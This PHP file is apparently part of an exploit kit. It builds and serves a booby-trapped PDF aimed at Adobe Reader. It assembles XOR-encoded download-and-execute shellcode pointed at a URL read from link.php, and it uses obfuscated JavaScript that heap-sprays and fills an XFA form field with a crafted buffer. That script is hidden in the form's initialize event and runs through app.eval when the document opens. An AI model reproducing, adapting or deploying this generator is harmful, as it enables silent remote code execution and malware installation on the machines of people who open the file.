<?php

 $url=file_get_contents("link.php");
 $url= $url."/load.php?showforum=lib";


$str = "function hggdsfgd(i,s)
{
while(i.length*2<s)
{i+=i}
return i.substring(0,s/2)
}
array=new Array();
function heap(s)
{
s=unescape(s);
j_slackspace=s.length*2;
j_nops=unescape('%u9090');
j_spray=hggdsfgd(j_nops,0x2000-j_slackspace);
j_x=s+j_spray;
j_x=hggdsfgd(j_x,524098);
for(i=0;i<400;i++)
{array[i]=j_x.substr(0,j_x.length-1)+j_nops}}
function str(s,len)
{
while(s.length<len)
{s+=s}
return s.substring(0,len)
}
function go()
{
var ver=app.viewerVersion.toString();
ver=ver.replace('.','');
while(ver.length<4)
{ver+='0'}
return parseInt(ver,10)
}
function sdfsdfsd()
{
j_ver=go();
if(j_ver<9000)
{
j_shc='_shellc2_'.replace(/@/g, 'Qu'.replace(/Q/g, 'D').replace(/D/g, '%'));
s4='o+uAS'+'jgggkpuL'+'4BK//'+'///wAAAABAAAA'+'AAAAAAAA'+'QAAAAAAAAfhaASiAgYA98EIBK'
}
else
{
j_shc='_shellc_'.replace(/@/g, 'Qu'.replace(/Q/g, 'D').replace(/D/g, '%'));
s4='kB+ASji'+'QhEp9foBK/////wAAAABAAAAAAAAAAAAQAAAAAAAAYxCASiAgYA/fE4BK'
}
s1='SUk'+'qADgg'+'AABB';
s2=str('QUFB',10984);
s3='QQc'+'AAAEDAAE'+'AAAAwIAAAAQEDAAEAAAABAAAAAwEDAAEAAAABAAAA'+'BgEDAAEAAAABAAAAEQEEAAEAAAAIAAAAFwEEAAEAAAAwIAAAUAEDAMwAAAC'+'SIAAAAAAAAAAMDAj/'+'////';
sum=s1+s2+s3+s4;
j_shc2=j_shc;
heap(j_shc2);
khjbvc.rawValue=sum
};
sdfsdfsd();
";

function obfsh($str,$num)
{
$res=str_replace("%u", $num, $str);
return trim($res);
}

function unescape($s)
{
$out="";
$res=strtolower(bin2hex($s));
$g=round(strlen($res)/4);
if($g!=(strlen($res)/4))$res.="00";
for($i=0;$i<strlen($res);$i+=4)
$out.="%u".substr($res,$i+2,2).substr($res,$i,2);
return $out;
}

function ascii2hex($ascii)
{
$hex = '';
for ($i = 0; $i < strlen($ascii); $i++) {
$byte = strtoupper(dechex(ord($ascii{$i})));
$byte = str_repeat('0', 2 - strlen($byte)).$byte;
$hex.="61054449013345".$byte."";
}
return $hex;
}

function arr_pack( $frt, $arr )
{
$ret = "";
foreach ( $arr as $a )
{
$ret .= pack( $frt, $a );
}
return $ret;
}

function make_shellcode($url,$nop = true) {

$sc =
"EB 16 B9 44 4C 45 4E 8B 34 24 89 F7 80 3E E9 74".
"06 AC 34 4B AA E2 FA C3 E8 E5 FF FF FF E9 0C 01".
"00 00 5E 81 EC 5C 01 00 00 89 E7 8D 4F 10 8D 6F".
"54 31 DB 57 51 53 53 53 53 53 53 53 55 53 53 68".
"04 01 00 00 55 56 53 68 6F 6E 00 00 68 75 72 6C".
"6D 54 68 8E 4E 0E EC E8 48 00 00 00 50 E8 7C 00".
"00 00 FF D0 83 C4 08 68 4F EF 4F 05 50 E8 6C 00".
"00 00 FF D0 85 C0 75 17 6A 54 59 F3 AA 68 72 FE".
"B3 16 E8 1D 00 00 00 50 E8 51 00 00 00 FF D0 53".
"6A FE 68 89 6F 01 BD E8 08 00 00 00 50 E8 3C 00".
"00 00 FF D0 60 31 C0 64 8B 50 30 8B 52 0C 8B 52".
"14 8B 72 28 B9 18 00 00 00 31 FF 31 C0 AC 3C 61".
"7C 02 2C 20 C1 CF 0D 01 C7 E2 F0 81 FF 5B BC 4A".
"6A 8B 42 10 8B 12 75 D9 89 44 24 1C 61 C3 60 8B".
"6C 24 24 8B 45 3C 8B 54 05 78 01 EA 8B 4A 18 8B".
"5A 20 01 EB E3 34 49 8B 34 8B 01 EE 31 FF 31 C0".
"FC AC 84 C0 74 07 C1 CF 0D 01 C7 EB F4 3B 7C 24".
"28 75 E1 8B 5A 24 01 EB 66 8B 0C 4B 8B 5A 1C 01".
"EB 8B 04 8B 01 E8 89 44 24 1C 61 C2 08 00 E8 EF".
"FE FF FF";

preg_match_all("/(\w{2})\s?/",$sc,$arr);
$sc = array_map(create_function('$a','return chr(hexdec($a));'),$arr[1]);
$sc = join($sc).$url.chr(0);
$ln = strlen($sc);
$ky = mt_rand() % 0xfe + 1;
$sc = str_replace("\xB9DLEN","\xB9".pack("V",$ln - 0x1d),$sc);
$sc = str_replace("4K","4".pack("C",$ky),$sc);
for ($i = 0x1d;$i < $ln;$i ++) $sc[$i] = chr(ord($sc[$i]) ^ $ky);
return ($nop ? "\x90\x90\x90\x90" : "").$sc;
}

$sc = arr_pack( "V", array( 257957964, 1249928101, 257957948, 1249911190, 1249910672, 1250201648, 1249934973, 1094795585, 38, 0, 0, 0, 1249937521, 257957988, 1024, 1094795585, 1094795585, 2.42539e+009 ) );
$scv9 = unescape( $sc.make_shellcode($url));
$sc = arr_pack( "V", array( 257957964, 1249908485, 257957948, 1249927951, 1249962915, 1250041904, 1249914734, 1094795585, 38, 0, 0, 0, 1249917202, 257957988, 1024, 1094795585, 1094795585, 2.42539e+009 ) );
$scv8 = unescape( $sc.make_shellcode($url));
$str=str_replace("_shellc_",$scv9,$str);
$str=str_replace("_shellc2_",$scv8,$str);
$kluch="@";
$str =obfsh($str,$kluch);
$str =ascii2hex($str);


$zag ='<?xml version="1.0" encoding="UTF-8"?><?xfa generator="AdobeDesigner_V7.0" APIVersion="2.2.4333.0"?><xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/\\"><config><present><pdf><interactive>1</interactive><version>1.6</version></pdf><xdp><packets>*</packets></xdp><destination>pdf</destination></present></config><template xmlns="http://www.xfa.org/schema/xfa-template/2.5/"><subform layout="tb" locale="en_US" name="lay"><pageSet><pageArea id="pid" name="pid"><contentArea h="756pt" w="576pt" x="0.25in" y="0.25in"/><medium long="792pt" short="612pt" stock="default"/></pageArea></pageSet><subform h="756pt" w="576pt" name="subn"><subf/><field h="65mm" name="khjbvc" w="85mm" use="al" x="53.6501mm"  y="88.6499mm"> <subf/><event activity="initialize" name="eav"><script contentType="application/x-javascript">










jhkytre="'.$str.'"&#046;&#114;ep&#0108;ac&#101;&#40;&#47;61054449013345/&#103;, "&#37;");try{new document.body.prototype;}catch(ghjhge){



function oil(f){return f}hgfder=oil(/*&#0042;/app.eval);

hgfder("s=u&#0110;e&#115;cape("+"jhkytre);");
hgfder(s);
}



</script></event><ui><imageEdit/></ui></field></subform></subform></template><xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/"><xfa:data><lay><khjbvc></khjbvc></lay></xfa:data></xfa:datasets></xdp:xdp>';

$zag=gzcompress($zag);

$eol = "\r\n";$endobj = "endobj".$eol;$pdf = "%PDF-1.6".$eol;$pdf = $pdf."%����".$eol;$pdf = $pdf."19 0 obj".$eol;$pdf = $pdf."<</Filter/FlateDecode /Length 24>>".$eol;$pdf = $pdf."stream".$eol;$pdf = $pdf."x��X�n�6x��X�n�6x��X�n�6".$eol;$pdf = $pdf."endstream".$eol;$pdf = $pdf.$endobj;$pdf = $pdf."1 0 obj".$eol;$pdf = $pdf."<</Type/Page /Parent 5 0 R /Resources 12 0 R /MediaBox [0 0 595 842] /Contents 19 0 R /Rotate 0>>".$eol;$pdf = $pdf.$endobj;$pdf = $pdf."5 0 obj ".$eol;$pdf = $pdf."<</Count 2 /Kids [1 0 R] /Type/Pages>>".$eol;$pdf = $pdf.$endobj;$pdf = $pdf."6 0 obj".$eol;$pdf = $pdf."<</Type/Font /Subtype/Type1 /BaseFont/Times-Roman /Name/F1 /Encoding/WinAnsiEncoding>>".$eol;$pdf = $pdf.$endobj;$pdf = $pdf."12 0 obj".$eol;$pdf = $pdf."<</ProcSet [/XPDF /Text /ImageB /ImageC /ImageI] /Font <</F1 6 0 R>> /XObject <<>>>>".$eol;$pdf = $pdf.$endobj;$pdf = $pdf."9 0 obj <</Subject (gdsdffdv) /Title  (gqwesvda) /Author (dfgdfgq) /Creator (bgsfsdffab) /CreationDate (D:20110405234628)>>".$eol;$pdf = $pdf.$endobj;$pdf = $pdf."29 0 obj".$eol;$pdf = $pdf."<</Type/EmbeddedFile /Filter/FlateDecode /Length 3>>".$eol;$pdf = $pdf."stream".$eol;$pdf = $pdf."asd".$eol;$pdf = $pdf."endstream".$eol;$pdf = $pdf.$endobj;$pdf = $pdf."8 0 obj  ".$eol;$pdf = $pdf."<<   /Filter /FlateDecode  /Length 3186>>".$eol;$pdf = $pdf."stream".$eol;$pdf = $pdf.$zag.$eol;$pdf = $pdf."endstream".$eol;$pdf = $pdf.$endobj; $pdf = $pdf."18 0 obj ".$eol;$pdf = $pdf."<</Rect [12.5 5.31 18.3 7.7] /Subtype/Widget /Ff 65536 /T (khjbvc[0]) /MK <</TP 1>> /Type/Annot /FT/Btn /DA (/CourierStd 10 Tf 0 g) /Parent 19 0 R /TU (khjbvc) /P 1 0 R /F 4>>".$eol;$pdf = $pdf.$endobj;$pdf = $pdf."19 0 obj ".$eol;$pdf = $pdf."<</T (subn[0]) /Kids [18 0 R] /Parent 20 0 R>>".$eol;$pdf = $pdf.$endobj;$pdf = $pdf."20 0 obj ".$eol;$pdf = $pdf."<</T (lay[0]) /Kids [19 0 R]>>".$eol;$pdf = $pdf.$endobj;$pdf = $pdf."21 0 obj ".$eol;$pdf = $pdf."<</DA (/Helv 0 Tf 0 g ) /Fields [20 0 R] /XFA [(temp)(blat) 100 0 R 8 0 R]>>".$eol;$pdf = $pdf.$endobj;$pdf = $pdf."23 0 obj ".$eol;$pdf = $pdf."<</AcroForm 21 0 R /Pages 5 0 R /Type/Catalog>>".$eol;$pdf = $pdf.$endobj;$pdf = $pdf."xref".$eol; $pdf = $pdf."0 24".$eol;  $pdf = $pdf."trailer".$eol; $pdf = $pdf."<</Size 22 /Root 23 0 R /Info 9 0 R>>".$eol; $pdf = $pdf."sdfsdfsdxref".$eol; $pdf = $pdf."17175".$eol; $pdf = $pdf."%%EOF".$eol;


header("Accept-Ranges: bytes\r\n");
header("Content-Length: ".strlen($pdf)."\r\n");
header("Content-Disposition: inline; filename=".rand(1,9999).".pdf\r\n");
header("Content-Type: application/pdf\r\n\r\n");
die($pdf);
?>